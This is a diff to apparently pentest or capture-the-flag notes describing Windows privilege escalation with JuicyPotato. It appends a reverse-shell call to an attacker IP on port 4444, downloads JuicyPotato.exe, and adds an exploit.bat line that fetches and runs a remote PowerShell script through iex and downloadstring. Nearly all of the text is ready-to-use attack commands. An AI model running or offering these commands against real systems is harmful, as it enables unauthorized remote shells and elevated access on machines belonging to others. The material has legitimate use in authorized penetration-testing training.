@@ -220,6 +220,9 @@
         - Just simple change in this code is to append this line - `Invoke-PowerShellTcp -Reverse -IPAddress <Attacker-IP> -Port 4444` - at the end of the code.
         - `Kali> wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe`
         - Create a new file with name - `exploit.bat` with following code
+		```
+		powershell.exe -c iex(new-object net.webclient).downloadstring('http://<Attacker-IP>/Invoke-PowerShellTcp.ps1')
+		```
         - Transfer `JuicyPotato.exe` and `exploit.bat` to remote system.
         - Gain shell with elevated privileges
 	        - Migrate to directory containing Invoke-PowerShellTcp.ps1
